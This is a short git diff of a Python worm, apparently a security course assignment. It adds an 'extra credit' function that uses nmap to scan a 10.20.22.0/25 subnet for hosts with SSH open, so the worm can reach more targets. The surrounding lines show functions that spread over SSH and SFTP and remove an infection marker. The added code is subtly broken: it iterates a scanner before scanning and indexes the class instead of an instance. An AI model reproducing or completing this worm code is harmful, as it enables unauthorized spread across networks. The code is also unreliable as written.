@@ -69,6 +69,7 @@ def spreadAndExecute(sshClient):
     sftpClient.close()
     sshClient.close()
 
+#Extra Credit Part 1
 
 def spreadAndClean(sshClient):
     sftpClient = sshClient.open_sftp()
@@ -76,6 +77,28 @@ def spreadAndClean(sshClient):
     sftp.remove(INFECTED_MARKER_FILE)
     sftpClient.close()
     sshClient.close()
+
+    
+#Extra Credit Part 2
+    
+def extendspread():
+
+   hosts= nmap.PortScanner()
+   liveHosts = []
+   for host in hosts:
+        if PortScanner[host].state() == "up":    
+            liveHosts.append(host)
+            
+   if  "-m" in sys.argv or "--multi" in sys.argv:
+        mPortScanner = nmap.PortScanner()
+        mPortScanner.scan('10.20.22.0/25', arguments='-p 22 --open')
+        multiData = mPortScanner.all_hosts()
+
+        for multiHost in multiData:
+            if mPortScanner[multiHost].state() == "up":
+                liveHosts.append(multiHost)
+    
+        return liveHosts
 
 
 ############################################################
